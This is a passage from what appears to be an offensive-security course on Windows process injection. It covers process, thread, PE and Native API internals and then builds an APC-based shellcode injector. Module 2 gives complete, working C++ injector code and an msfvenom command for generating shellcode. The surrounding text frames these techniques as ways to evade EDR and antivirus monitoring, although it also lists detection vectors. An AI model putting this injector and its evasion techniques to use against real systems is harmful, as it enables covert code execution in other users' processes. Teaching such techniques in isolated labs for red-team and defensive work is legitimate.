thread runs on which core and for how long (time slicing).\r\n\r\n**Why is this important for us?**\r\nTo execute our injected code, we need a thread in the target process to jump to our code's address.\r\n*   We could create a *new* thread (`CreateRemoteThread`, `NtCreateThreadEx`).\r\n*   We could hijack an *existing* thread. This is where understanding thread states and the TIB becomes critical. Can we redirect a thread that's currently waiting? Can we manipulate its context (`GetThreadContext`, `SetThreadContext`)? Yes, and we will explore these techniques.\r\n\r\n### **1.3 Fibers: Cooperative Execution Units**\r\n\r\nFibers are a different beast. They are *user-mode* constructs that allow an application to implement its own cooperative scheduling. Unlike threads, which are scheduled preemptively by the OS kernel, fibers are scheduled by the application itself using specific API calls (`SwitchToFiber`).\r\n\r\n**Fibers vs. Threads:**\r\n\r\n*   **Scheduling:** OS (preemptive) for Threads, Application (cooperative) for Fibers.\r\n*   **Overhead:** Creating a Fiber is generally lighter than creating a Thread. Switching *between* fibers within the *same thread* is also lighter than an OS thread context switch.\r\n*   **Stack:** Multiple fibers can run *within a single thread*. They can potentially share the same stack, although typically each fiber is created with its own stack. This requires careful management by the application.\r\n*   **OS Visibility:** The OS scheduler only sees the *thread* that the fiber is running on, not the fiber itself. Debuggers and monitoring tools often have less native support for enumerating or tracking fibers compared to threads.\r\n\r\n**Why are Fibers relevant?**\r\nThey represent another potential execution context within a process. If we can inject code and somehow get a fiber within a target thread to switch to our code, that's another path to execution. Their lower visibility to standard OS tools can sometimes make them an attractive, albeit less common, target or mechanism for injection (as we'll see in Module 4).\r\n\r\n### **1.4 The Portable Executable (PE) Format Revisited**\r\n\r\nYou've likely encountered the PE format (.exe, .dll, .sys files) if you've done any reverse engineering or binary analysis. It's the structure that defines how Windows executables are organized. For our purposes, we need to focus on a few key parts:\r\n\r\n*   **Headers:** The initial structures (DOS Header, NT Headers) that provide crucial metadata about the file, including the location of other important structures.\r\n*   **Data Directories:** An array within the Optional Header that points to various important tables, including the Import Address Table (IAT) and the Export Address Table (EAT).\r\n*   **Import Address Table (IAT):** This table lists the functions that the executable imports from *other* DLLs. When the Windows loader loads a PE file, it finds the required DLLs, resolves the addresses of the imported functions, and patches the IAT entries to point directly to those functions in memory. Static analysis tools love to look at the IAT to see what API calls a program is likely to make.\r\n*   **Export Address Table (EAT):** This table lists the functions that a DLL (or sometimes an EXE) *exports* for *other* modules to use. It contains the names (or ordinals) and the relative virtual addresses (RVAs) of the exported functions within the module. This table is *essential* for dynamic API resolution, which we'll cover in Module 6.\r\n\r\n**Why is this important for us?**\r\n*   Understanding the IAT shows us how static linking works and why it's a detection vector.\r\n*   Understanding the EAT is fundamental to implementing our *own* dynamic API resolution, allowing us to find function addresses at runtime without relying on the easily detectable IAT or standard `GetProcAddress`. This is straight out of the `zhasslan.txt` playbook ‚Äì avoid relying on standard library/loader features that can be monitored.\r\n\r\n### **1.5 User-Mode API Layers: WinAPI vs. Native API**\r\n\r\nWindows provides multiple layers of APIs for user-mode applications to interact with the OS:\r\n\r\n*   **WinAPI:** This is the high-level, well-documented API set (`kernel32.dll`, `user32.dll`, `gdi32.dll`, etc.). Functions like `CreateProcess`, `CreateWindow`, `WriteFile`, `VirtualAllocEx`, `CreateRemoteThread`. These are designed for application developers, are relatively stable across Windows versions, and handle a lot of complexity internally.\r\n*   **Native API:** This is a lower-level API set exposed primarily by `ntdll.dll`. Functions typically start with `Nt` or `Zw` (e.g., `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtCreateThreadEx`, `NtQueueApcThread`). These functions are often less documented, can be more sensitive to OS version changes, and provide a more direct interface to the kernel's system call dispatcher. WinAPI functions often act as wrappers around one or more Native API calls.\r\n\r\n```mermaid\r\ngraph LR\r\n    A[Your User Application] --> B(WinAPI - kernel32.dll, etc.)\r\n    B --> C(Native API - ntdll.dll)\r\n    A --> C\r\n    C --> D{Syscall Interface}\r\n    D --> E[Windows Kernel]\r\n```\r\n\r\n**Why use Native API?**\r\n*   **Stealth:** Calling Native API functions directly can bypass user-mode hooks placed by security products on common WinAPI functions.\r\n*   **Reduced Imports:** By manually resolving and calling Native API functions, your executable's IAT might only show imports for `ntdll.dll` itself, and possibly only functions needed to *start* the resolution process (like `LdrGetProcedureAddress` or even lower-level PE parsing), making static analysis harder. This aligns with the `zhasslan.txt` philosophy of minimizing reliance on high-level, easily monitored components.\r\n*   **Access to Lower-Level Features:** Some kernel features or options are only exposed via the Native API.\r\n\r\nWe will dive much deeper into finding and using Native API calls in Module 3 and integrating them with dynamic resolution in Modules 6 and 7.\r\n\r\n### **1.6 Why Go Beyond Basic `CreateRemoteThread`/`WriteProcessMemory`?**\r\n\r\nOkay, let's address the elephant in the room. The simplest, most widely known injection technique is:\r\n\r\n1.  `OpenProcess` on the target.\r\n2.  `VirtualAllocEx` in the target to allocate memory (often `PAGE_EXECUTE_READWRITE`).\r\n3.  `WriteProcessMemory` to copy your shellcode into the allocated memory.\r\n4.  `CreateRemoteThread` in the target, pointing the start address to your shellcode.\r\n5.  `CloseHandle`s.\r\n\r\nThis works! And for a long time, it was sufficient. But modern security products (EDRs, AVs) *heavily* monitor these specific API calls, especially when used across processes.\r\n\r\n**Limitations and Detection Vectors of Simple Injection:**\r\n\r\n*   **API Monitoring:** Security software hooks `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`. They look for suspicious patterns:\r\n    *   `OpenProcess` calls with high access rights (`PROCESS_ALL_ACCESS`) targeting common processes (`explorer.exe`, `lsass.exe`, browsers).\r\n    *   `VirtualAllocEx` allocating executable memory (`PAGE_EXECUTE*`) in another process.\r\n    *   `WriteProcessMemory` writing data *into* that newly allocated executable memory.\r\n    *   `CreateRemoteThread` being called where the `lpStartAddress` parameter points into memory allocated by `VirtualAllocEx` (not a standard loaded module).\r\n*   **Memory Scanning:** Security products can scan process memory for patterns indicative of injected shellcode (e.g., known shellcode bytes, highly suspicious byte sequences, executable memory regions not backed by a file on disk).\r\n*   **Thread Analysis:** They can enumerate threads and look for threads whose start address is in memory not associated with a legitimate module, or threads whose call stack looks unusual.\r\n*   **IAT Analysis:** The injector executable itself might have a suspicious IAT showing imports for `OpenProcess`, `VirtualAllocEx`, etc.\r\n\r\nOur goal in this course is to learn techniques that are harder to detect by avoiding these common patterns. We'll explore:\r\n\r\n*   Using different execution contexts (APCs, Fibers) instead of just creating a new thread.\r\n*   Using lower-level Native API calls instead of well-known WinAPI wrappers.\r\n*   Obscuring our API calls using dynamic resolution and hashing.\r\n*   Leveraging unconventional methods that security products might not explicitly monitor.\r\n\r\nThis requires a deeper understanding of the underlying mechanisms, which is exactly what Module 1 is all about!\r\n\r\n### **1.7 Putting It Together**\r\n\r\nSo, to recap Module 1:\r\n\r\n*   A **Process** is an isolated container with its own **Virtual Address Space** (split into user and kernel modes) and resources.\r\n*   **Threads** are the active units of execution within a process, each with its own context and stack, scheduled by the OS. Understanding **Thread States** and the **TIB** is key.\r\n*   **Fibers** are user-mode, cooperatively scheduled execution units that live *within* a thread.\r\n*   The **PE Format** defines how executables are structured. The **IAT** is for imported functions (a static analysis target), and the **EAT** is for exported functions (our key for dynamic resolution).\r\n*   The **Native API** (`ntdll.dll`) provides a lower-level interface to the OS compared to the higher-level **WinAPI**, offering potential stealth benefits.\r\n*   Standard injection techniques relying on `CreateRemoteThread` and `WriteProcessMemory` are easily detected due to API monitoring and memory scanning. We need more advanced methods.\r\n\r\nThis foundational knowledge is our starting point. Now, let's get hands-on!\r\n\r\n---\r\n\r\n### **Module 1 Project/Exercise: Exploring Processes and Threads**\r\n\r\nThis exercise has two parts. Part 1 uses a debugger to explore a running process, and Part 2 involves writing a simple C++ tool.\r\n\r\n**Goal:** Get comfortable observing process/thread details and writing basic code to interact with processes.\r\n\r\n**Environment Setup:**\r\n*   Make sure you have a debugger installed (WinDbg from the Windows SDK or x64dbg).\r\n*   Have your C/C++ environment ready.\r\n*   **Crucially:** Do this inside your isolated Virtual Machine!\r\n\r\n#### **Part 1: Debugger Analysis of `notepad.exe`**\r\n\r\nWe'll use `notepad.exe` because it's simple, runs in user-mode, and is present on every Windows system.\r\n\r\n**Steps:**\r\n\r\n1.  **Start `notepad.exe`:** Just run it normally.\r\n2.  **Find its Process ID (PID):** Open Task Manager (Ctrl+Shift+Esc). Go to the \"Details\" tab. Find `notepad.exe` in the list and note its PID. Keep Task Manager open.\r\n3.  **Attach your Debugger:**\r\n    *   **WinDbg:** Open WinDbg. Go to `File -> Attach to a Process...`. Find `notepad.exe` by name or PID. Select it and click \"Attach\". WinDbg will likely break into the process immediately. Type `g` and press Enter to let it run (`g` stands for \"go\"). To break in again, press `Ctrl+Break`.\r\n    *   **x64dbg:** Open x64dbg (choose 32-bit or 64-bit version based on your OS/Notepad architecture, usually 64-bit on modern systems). Go to `File -> Attach`. Find `notepad.exe` by name or PID. Select it and click \"Attach\". x64dbg will break in. Click the \"Run\" button (or F9) to let it run. To pause, click the \"Pause\" button.\r\n4.  **Enumerate Threads and Observe States:**\r\n    *   **WinDbg:** Break into the process (`Ctrl+Break`). Type `~` and press Enter. This lists all threads. The output will show thread IDs (e.g., `0`, `1`, `2`) and possibly an indicator like `.`. To see more detail, including the *state*, type `~* kb` and press Enter. This runs the `kb` (display stack backtrace) command for *all* threads (`~*`). Look at the output. Can you identify threads that are in a \"Wait\" state? What functions are they waiting in? (e.g., `WaitForSingleObject`, `MsgWaitForMultipleObjects`). Why might they be waiting? (Hint: Notepad is a GUI application, its threads wait for user input or messages).\r\n    *   **x64dbg:** Go to the \"Threads\" tab in the main window. You'll see a list of threads, their IDs, and their current state (e.g., Running, Waiting, Suspended). Observe the states. Select a Waiting thread and look at its Call Stack pane ‚Äì what functions are at the top of the stack?\r\n5.  **Identify Loaded Modules and Base Addresses:**\r\n    *   **WinDbg:** Type `lm` and press Enter. This lists all loaded modules (`.exe` and `.dll` files). Find `notepad.exe`, `kernel32.dll`, `ntdll.dll`, `user32.dll`, etc. Note their base addresses (the starting memory address where they are loaded).\r\n    *   **x64dbg:** Go to the \"Memory Map\" tab. This shows all allocated memory regions, including mapped modules. Find the base addresses for `notepad.exe`, `kernel32.dll`, `ntdll.dll`, etc. You can also see loaded modules in the \"Modules\" tab, which lists base addresses.\r\n6.  **Examine a Module's PE Header (Focus on Export Directory):**\r\n    *   Choose either `kernel32.dll` or `ntdll.dll`. Get its base address from the previous step. Let's say `kernel32.dll` is loaded at `0x7FFxxxxxxxxx`.\r\n    *   We need to find the PE header. The DOS header is always at the base address (`0x7FFxxxxxxxxx`). The DOS header contains a pointer (at offset `0x3C`) to the NT Headers. Let's find that pointer.\r\n        *   **WinDbg:** Type `dd <base_address>+3c L1` (e.g., `dd 0x7FFxxxxxxxxx+3c L1`). This displays a double-word (4 bytes) or quad-word (8 bytes on 64-bit) at that offset. The value you see is the RVA (Relative Virtual Address) of the NT Headers *relative to the module's base*. Add this RVA to the base address to get the absolute address of the NT Headers.\r\n        *   **x64dbg:** Go to the \"Dump\" tab. Enter the base address of the DLL. Scroll or go to offset `+3C`. Read the 4 bytes there (it's a DWORD). This is the RVA of the NT Headers. Add it to the base address.\r\n    *   Now, go to the address of the NT Headers. The NT Headers structure contains the File Header and the Optional Header. The Optional Header is where the Data Directories are located. For a 64-bit PE, the Data Directories start at offset `0x88` from the start of the Optional Header. For a 32-bit PE, they start at offset `0x78`. The Export Directory is the *first* entry (index 0) in the Data Directory array.\r\n    *   Let's find the address of the Export Directory entry in the Data Directory array. Go to the address of the NT Headers + File Header Size + Offset to Data Directories. (File Header size is 20 bytes for 64-bit, 24 for 32-bit).\r\n        *   **WinDbg:** Type `dt _IMAGE_NT_HEADERS64 <nt_headers_address>`. This will display the structure. Find the `OptionalHeader.DataDirectory` array. The first entry is the Export Directory. Note its `VirtualAddress` (this is the RVA of the Export Directory Table itself) and `Size`.\r\n        *   **x64dbg:** Go to the Dump tab at the NT Headers address. Manually navigate to the Optional Header (NT Headers + 24 bytes for 32-bit, + 20 bytes for 64-bit). Then navigate to the Data Directories within the Optional Header (+0x78 for 32-bit, +0x88 for 64-bit). The first 8 bytes (4 for RVA, 4 for Size) are for the Export Directory. Note the RVA (the first 4 bytes).\r\n    *   Add the Export Directory RVA to the module's base address to get the absolute memory address of the Export Directory Table in the target process. This is the table we'll parse manually in Module 6!\r\n    *   **Using a PE Viewer Tool (Recommended for beginners):** Before doing this manually in the debugger, use a tool like PE-Bear or CFF Explorer to open `C:\\Windows\\System32\\kernel32.dll` (or `SysWOW64` for 32-bit). These tools parse the PE"
    },
    {
      "title": "module_2",
      "description": "module_2 Overview",
      "order": 2,
      "content": "Alright team, welcome back! Module 1 laid the groundwork, giving us a crucial understanding of Windows processes, threads, and memory from a low-level perspective. We saw *why* understanding things like the PE format and Native API is essential, and we touched on the limitations of simple `CreateRemoteThread` injection ‚Äì it's often noisy and easily detectable.\r\n\r\nNow, we're going to build on that foundation and explore our first advanced execution technique: **Asynchronous Procedure Calls (APCs)**. This method allows us to queue a function (our shellcode) to be executed by an *existing* thread within a target process. It's a powerful technique that bypasses the need to create a *new* thread, which can sometimes be a detection vector.\r\n\r\nLet's dive deep into Module 2!\r\n\r\n---\r\n\r\n## Module 2: Hijacking Execution - Asynchronous Procedure Calls (APCs)\r\n\r\n*   **Module Objective:** Learn how Asynchronous Procedure Calls (APCs) function and implement code to queue and trigger execution of arbitrary code within a target thread using APCs.\r\n\r\n### Introduction: Why APCs?\r\n\r\nImagine you're a thread busy doing its work. Suddenly, the operating system needs you to do something else urgently, but it doesn't want to force you to stop *immediately*. Instead, it leaves a message for you in your \"inbox.\" The next time you reach a natural pause point where you're waiting for something (like waiting for user input, a file operation to complete, or a timer to expire), you check your inbox, find the message, and execute the requested task before returning to what you were doing.\r\n\r\nThis is the essence of a User-Mode APC. It's a mechanism to request that a specific thread execute a function *asynchronously* at a later time, specifically when that thread enters an \"alertable state.\" For us offensive folks, this means we can queue our malicious code (shellcode) to an existing thread in a target process.\r\n\r\nCompared to `CreateRemoteThread`, APC injection doesn't create a brand new thread entry in the target process's thread list (which defenders might monitor). It leverages the existing threads, making it potentially less conspicuous depending on the monitoring tools in place.\r\n\r\n### Essential Subtopics Deep Dive:\r\n\r\n#### 1. What are APCs? User-Mode vs. Kernel-Mode APCs.\r\n\r\n*   **APCs (Asynchronous Procedure Calls):** A system mechanism that allows a function to be executed asynchronously within the context of a specific thread. Each thread maintains an APC queue.\r\n*   **User-Mode APCs:** These are queued by user-mode code (like our injector) targeting a user-mode thread. The queued function will execute at `APC_LEVEL` (a specific IRQL, Interrupt Request Level, in the kernel, but we interact with it from user-mode). User-mode APCs are only dispatched when the target thread explicitly enters an *alertable state*. This is the type we will focus on in this module.\r\n*   **Kernel-Mode APCs:** These are queued by the kernel (or kernel-mode drivers) targeting *any* thread. They are typically used for internal OS operations (like I/O completion). Kernel-mode APCs can interrupt a thread's execution at any time (when the kernel deems safe, usually at `APC_LEVEL` or above), not just when it's alertable. We generally cannot queue kernel-mode APCs directly from user mode without exploiting a vulnerability or using specific kernel drivers, so they are less relevant for standard user-mode injection techniques.\r\n\r\n#### 2. The APC Queue and How it's Processed by Threads.\r\n\r\n*   Every thread object in the kernel has an associated APC queue.\r\n*   When a User-Mode APC is queued to a thread, the OS adds the APC request (including a pointer to the function to execute and optional parameters) to that thread's user-mode APC queue.\r\n*   The thread continues its normal execution until it enters an *alertable state*.\r\n*   When in an alertable state, the thread's dispatcher checks its user-mode APC queue.\r\n*   If there are queued APCs, the thread temporarily suspends its current execution context, switches to the context required by the APC function, executes the APC function, and then (upon the APC function's return) resumes its original execution context.\r\n*   The thread processes APCs from its queue one by one until the queue is empty, before returning from the alertable wait state.\r\n\r\n#### 3. The Concept of a Thread Being in an \"Alertable State\".\r\n\r\nThis is the critical dependency for User-Mode APC injection. The target thread *must* call a function that puts it into an alertable wait state for the APC to be dispatched. Common WinAPI functions that do this include:\r\n\r\n*   `SleepEx`\r\n*   `SignalObjectAndWait` (when the object is signaled *and* the wait is alertable)\r\n*   `WaitForMultipleObjectsEx`\r\n*   `WaitForSingleObjectEx`\r\n*   `MsgWaitForMultipleObjectsEx`\r\n*   Functions that involve waiting on I/O completion routines (IOCPs) using `FILE_FLAG_OVERLAPPED` and providing an APC function.\r\n\r\nMany GUI applications, service threads, or threads performing asynchronous I/O naturally enter alertable states. However, a thread that is constantly busy computing or running in a tight loop will *not* dispatch user-mode APCs queued to it until it eventually calls one of these alertable wait functions. This is a significant limitation and a potential detection vector (a thread that *should* be busy suddenly entering an alertable state might look suspicious).\r\n\r\n#### 4. Key API Functions for APCs: `NtQueueApcThread` (Native API) and `QueueUserAPC` (WinAPI).\r\n\r\n*   **`NtQueueApcThread` (Native API):** This is the lower-level system call that the WinAPI function wraps.\r\n    ```c++\r\n    // NtQueueApcThread signature (simplified/common representation)\r\n    // Actual signature requires understanding NTSTATUS and kernel structures\r\n    // This is often accessed via function pointer from ntdll.dll\r\n    typedef NTSTATUS (NTAPI* pNtQueueApcThread)(\r\n        HANDLE ThreadHandle,\r\n        PKNORMAL_ROUTINE ApcRoutine, // Pointer to the function to execute\r\n        PVOID NormalContext,         // 1st parameter for ApcRoutine\r\n        PVOID SystemArgument1,       // 2nd parameter for ApcRoutine\r\n        PVOID SystemArgument2        // 3rd parameter for ApcRoutine\r\n    );\r\n    ```\r\n    Calling `NtQueueApcThread` directly (which we'll explore more in Module 3) avoids the `kernel32.dll` import and gives us direct access to the syscall. The `ApcRoutine` is the address of our code, and `NormalContext`, `SystemArgument1`, `SystemArgument2` are optional parameters passed to it.\r\n\r\n*   **`QueueUserAPC` (WinAPI):** This is the standard WinAPI wrapper provided in `kernel32.dll`. It's simpler to use initially.\r\n    ```c++\r\n    DWORD WINAPI QueueUserAPC(\r\n      PAPCFUNC pfnAPC,       // Pointer to the APC function (our code)\r\n      HANDLE   hThread,      // Handle to the target thread\r\n      ULONG_PTR dwData       // Optional parameter passed to the APC function\r\n    );\r\n    ```\r\n    This function takes the address of the APC function (`pfnAPC`), a handle to the target thread (`hThread`), and a single `ULONG_PTR` data value (`dwData`) which is passed as the *first* parameter to `pfnAPC`. The `dwData` parameter is equivalent to `NormalContext` in `NtQueueApcThread`. The other two parameters (`SystemArgument1`, `SystemArgument2`) are typically set by the OS/wrapper.\r\n\r\n    For shellcode execution, `pfnAPC` will be the address where we've written our shellcode in the target process's memory. The shellcode needs to be designed to handle the single parameter passed to it (if `dwData` is used). Often, for simple payloads, `dwData` is set to 0, and the shellcode doesn't expect any parameters.\r\n\r\n#### 5. Practical Implementation: Writing an Injector.\r\n\r\nHere's the step-by-step process we'll follow to build our APC injector:\r\n\r\n1.  **Get a Handle to the Target Process:** We need `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, `PROCESS_VM_READ` (often included in `PROCESS_ALL_ACCESS` or a combination like `PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`) and `PROCESS_QUERY_INFORMATION` to interact with the process.\r\n    *   API: `OpenProcess`.\r\n\r\n2.  **Find a Suitable Thread in the Target Process:** We need a handle to one or more threads within the target process. We can enumerate threads belonging to the target process.\r\n    *   API: `CreateToolhelp32Snapshot` with `TH32CS_SNAPTHREAD`, `Thread32First`, `Thread32Next`. We'll iterate through the threads returned and check if their `th32OwnerProcessID` matches our target PID. We need `THREAD_SET_CONTEXT` (implicitly for `QueueUserAPC` to modify thread state) and `THREAD_QUERY_INFORMATION` permissions (often included in `THREAD_ALL_ACCESS`).\r\n    *   API: `OpenThread`.\r\n\r\n3.  **Allocate Memory in the Target Process:** We need a region of memory in the target process where we can write our shellcode. This memory needs execute permissions.\r\n    *   API: `VirtualAllocEx`. We'll request `MEM_COMMIT | MEM_RESERVE` and `PAGE_EXECUTE_READWRITE` protection.\r\n\r\n4.  **Write the Shellcode into the Allocated Memory:** Copy our shellcode byte array from our injector process into the allocated memory in the target process.\r\n    *   API: `WriteProcessMemory`.\r\n\r\n5.  **Queue the APC to the Target Thread(s):** Use `QueueUserAPC` to register our shellcode address as the APC function for the chosen thread(s).\r\n    *   API: `QueueUserAPC`. The first parameter will be the address returned by `VirtualAllocEx`.\r\n\r\n6.  **Trigger the APC (Implicitly or Explicitly):** The APC will execute when the target thread enters an alertable state. For simple cases targeting common processes (like `notepad.exe` when idle), this often happens naturally. For more robust injection, you might need to wait or even *force* a thread into an alertable state (e.g., suspending/resuming the thread, which is more complex and adds detection vectors). For this module, we'll rely on the thread naturally entering an alertable state, or suggest targeting processes known to do so.\r\n\r\n7.  **Clean Up:** Close the handles we opened.\r\n    *   API: `CloseHandle`.\r\n\r\n#### 6. Limitations, Common Pitfalls, and Detection Considerations.\r\n\r\n*   **Alertable State Dependency:** As discussed, the biggest limitation is the reliance on the target thread entering an alertable state. If it doesn't, the APC will remain queued indefinitely.\r\n*   **Thread Selection:** Choosing the \"right\" thread can be tricky. Some threads might be critical system threads where injecting could cause instability or crashes. Targeting a thread that is known to enter alertable states (like a GUI thread processing messages) is often preferred.\r\n*   **Shellcode Design:** The shellcode needs to be position-independent (PIC) if you can't guarantee its load address (though `VirtualAllocEx` gives you the address). It also needs to be aware it's running as an APC ‚Äì it shouldn't do anything that prevents the original thread's context from being restored or causes the thread to exit prematurely, unless that's the intended effect (e.g., shellcode to terminate the process). Simple payloads like spawning `calc.exe` or showing a message box are usually fine.\r\n*   **Detection Vectors:**\r\n    *   **API Monitoring:** Monitoring calls to `OpenProcess`, `OpenThread`, `VirtualAllocEx`, `WriteProcessMemory`, and especially `QueueUserAPC` (`NtQueueApcThread`). EDRs often hook these functions.\r\n    *   **Memory Scanning:** Detecting executable memory (`PAGE_EXECUTE_READWRITE`) in regions not backed by legitimate loaded modules (`.dll`s or the main `.exe`). This is a very common detection method.\r\n    *   **Behavioral Analysis:** A process suddenly spawning a new process (`calc.exe`) after an `QueueUserAPC` call is observed can be a strong indicator.\r\n    *   **Thread State Analysis:** Monitoring thread states. While APCs don't create *new* threads, a thread entering an alertable state *unexpectedly* might be suspicious, though harder to reliably detect.\r\n\r\n### Module Project/Exercise: Building the APC Injector\r\n\r\n**Goal:** Create a C++ command-line tool that injects and executes a small shellcode payload into a target process using APCs.\r\n\r\n**Requirements:**\r\n\r\n1.  Accept the target Process ID (PID) as a command-line argument.\r\n2.  Accept the shellcode (as a byte array) either compiled directly into the tool or loaded from a file (compiling in is simpler for the first pass).\r\n3.  Use `OpenProcess` to get a handle to the target process with necessary permissions.\r\n4.  Use `CreateToolhelp32Snapshot` and the `Thread32First`/`Thread32Next` loop to enumerate threads belonging to the target PID.\r\n5.  Select *one* thread from the target process. For simplicity, picking the first thread found is often sufficient for basic testing, but be aware of the limitations mentioned above. Get a handle to this thread using `OpenThread`.\r\n6.  Use `VirtualAllocEx` to allocate executable memory in the target process.\r\n7.  Use `WriteProcessMemory` to write the shellcode into the allocated memory.\r\n8.  Use `QueueUserAPC` to queue the execution of the shellcode address to the selected thread handle. Pass `NULL` for the `dwData` parameter unless your shellcode is designed to accept it.\r\n9.  Include basic error checking for API calls (check return values for `NULL`, `FALSE`, etc.).\r\n10. Close all handles (`CloseHandle`).\r\n\r\n**Example Shellcode (for `calc.exe`):**\r\n\r\nYou can generate simple shellcode using tools like Metasploit's `msfvenom` or various online generators. For Windows x64, a simple `calc.exe` payload might look something like this (this is just an example, the actual bytes will vary based on generation options):\r\n\r\n```cpp\r\nunsigned char shellcode[] =\r\n    \"\\x50\\x51\\x52\\x53\\x56\\x57\\x55\\x6a\\x60\\x5a\\x6a\\x07\\x58\\x48\\x31\\xd2\"\r\n    \"\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xe2\"; // Example x64 calc.exe shellcode bytes\r\n```\r\n\r\n**Basic Code Structure (C++):**\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <iostream>\r\n#include <vector>\r\n#include <TlHelp32.h> // Required for CreateToolhelp32Snapshot, Thread32First/Next\r\n\r\n// Example shellcode (replace with your actual shellcode bytes)\r\n// This is a placeholder, replace with your generated payload!\r\nunsigned char shellcode[] =\r\n    \"\\x90\\x90\\x90\\x90\" // NOPs\r\n    // ... put your shellcode bytes here ...\r\n    \"\\xC3\"; // RET (simple return instruction)\r\nsize_t shellcodeSize = sizeof(shellcode);\r\n\r\nint main(int argc, char* argv[]) {\r\n    if (argc != 2) {\r\n        std::cerr << \"Usage: \" << argv[0] << \" <PID>\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    DWORD pid = std::stoi(argv[1]);\r\n    HANDLE hProcess = NULL;\r\n    HANDLE hThread = NULL;\r\n    LPVOID remoteBuffer = NULL;\r\n    THREADENTRY32 te32;\r\n\r\n    // 1. Get a handle to the target process\r\n    // Request necessary permissions\r\n    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // Using ALL_ACCESS for simplicity in lab\r\n    if (hProcess == NULL) {\r\n        std::cerr << \"Error: Could not open process \" << pid << \". GetLastError: \" << GetLastError() << std::endl;\r\n        return 1;\r\n    }\r\n    std::cout << \"Successfully opened process \" << pid << std::endl;\r\n\r\n    // 2. Find a suitable thread in the target process\r\n    te32.dwSize = sizeof(THREADENTRY32);\r\n    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\r\n\r\n    if (hThreadSnap == INVALID_HANDLE_VALUE) {\r\n        std::cerr << \"Error: CreateToolhelp32Snapshot failed. GetLastError: \" << GetLastError() << std::endl;\r\n        CloseHandle(hProcess);\r\n        return 1;\r\n    }\r\n\r\n    bool foundThread = false;\r\n    if (Thread32First(hThreadSnap, &te32)) {\r\n        do {\r\n            if (te32.th32OwnerProcessID == pid) {\r\n                // Found a thread in the target process\r\n                // Open a handle to this thread\r\n                // Request necessary permissions for QueueUserAPC\r\n                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID); // Using ALL_ACCESS for simplicity\r\n                if (hThread != NULL) {\r\n                    std::cout << \"Found and opened thread \" << te32.th32ThreadID << \" in process \" << pid << std::endl;\r\n                    foundThread = true;\r\n                    // For this example, we'll just use the first thread we find\r\n                    break;\r\n                } else {\r\n                     std::cerr << \"Warning: Could not open thread \" << te32.th32ThreadID << \". GetLastError: \" << GetLastError() << std::endl;\r\n                }\r\n            }\r\n        } while (Thread32Next(hThreadSnap, &te32));\r\n    }\r\n    CloseHandle(hThreadSnap);\r\n\r\n    if (!foundThread || hThread == NULL) {\r\n        std::cerr << \"Error: Could not find or open any thread in process \" << pid << std::endl;\r\n        CloseHandle(hProcess);\r\n        return 1;\r\n    }\r\n\r\n    // 3. Allocate memory in the target process\r\n    remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\r\n    if (remoteBuffer == NULL) {\r\n        std::cerr << \"Error: VirtualAllocEx failed. GetLastError: \" << GetLastError() << std::endl;\r\n        CloseHandle(hThread);\r\n        CloseHandle(hProcess);\r\n        return 1;\r\n    }\r\n    std::cout << \"Allocated \" << shellcodeSize << \" bytes at address \" << remoteBuffer << \" in target process.\" << std::endl;\r\n\r\n    // 4. Write the shellcode into the allocated memory\r\n    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {\r\n        std::cerr << \"Error: WriteProcessMemory failed. GetLastError: \" << GetLastError() << std::endl;\r\n        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);\r\n        CloseHandle(hThread);\r\n        CloseHandle(hProcess);\r\n        return 1;\r\n    }\r\n    std::cout << \"Successfully wrote shellcode to remote process memory.\" << std::endl;\r\n\r\n    // 5. Queue the APC to the target thread\r\n    // QueueUserAPC takes a pointer to the function to execute.\r\n    // Our shellcode is the function.\r\n    // We pass NULL for dwData as our example shellcode doesn't use it.\r\n    DWORD queueResult = QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, NULL);\r\n    if (queueResult == 0) { // QueueUserAPC returns non-zero on success\r\n         std::cerr << \"Error: QueueUserAPC failed. GetLastError: \" << GetLastError() << std::endl;\r\n         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);\r\n         CloseHandle(hThread);\r\n         CloseHandle(hProcess);\r\n         return 1;\r\n    }\r\n     std::cout << \"Successfully queued APC to thread \" << te32.th32ThreadID << \". Waiting for thread to enter alertable state...\" << std::endl;\r\n\r\n    // Note: The shellcode will execute when the target thread\r\n    // enters an alertable state (e.g., calls SleepEx, WaitForSingleObjectEx, etc.).\r\n    // For testing, target a process like notepad.exe and just wait a moment.\r\n    // You might need to interact with the target application to trigger the state change.\r\n\r\n    // 7. Clean up\r\n    // We don't need to free the remote buffer immediately as the shellcode might still need it.\r\n    // A more sophisticated injector would handle this, but for a simple demo, we leave it.\r\n    CloseHandle(hThread);\r\n    CloseHandle(hProcess);\r\n\r\n    std::cout << \"Injection process finished. Check the target process for shellcode execution.\" << std::endl;\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n**How to Compile and Test:**\r\n\r\n1.  Save the code as a `.cpp` file (e.g., `APCInjector.cpp`).\r\n2.  Generate your actual shellcode byte array (e.g., using `msfvenom -p windows/x64/exec CMD=calc.exe -f c`). Replace the placeholder `shellcode` array in the C++ code with your generated bytes.\r\n3.  Compile using Visual Studio (create a C++ console project and add the file) or g++:\r\n    ```bash\r\n    g++ APCInjector.cpp -o APCInjector.exe -lkernel32\r\n    ```\r\n4.  Open a target application (like `notepad.exe`). Find its PID using Task Manager or `tasklist`.\r\n5.  Run your compiled injector from a command prompt:\r\n    ```bash\r\n    APCInjector.exe <PID_of_notepad>\r\n    ```\r\n6.  If successful, `calc.exe` should pop up after a short delay, demonstrating that your shellcode executed within the `notepad.exe` process via the APC 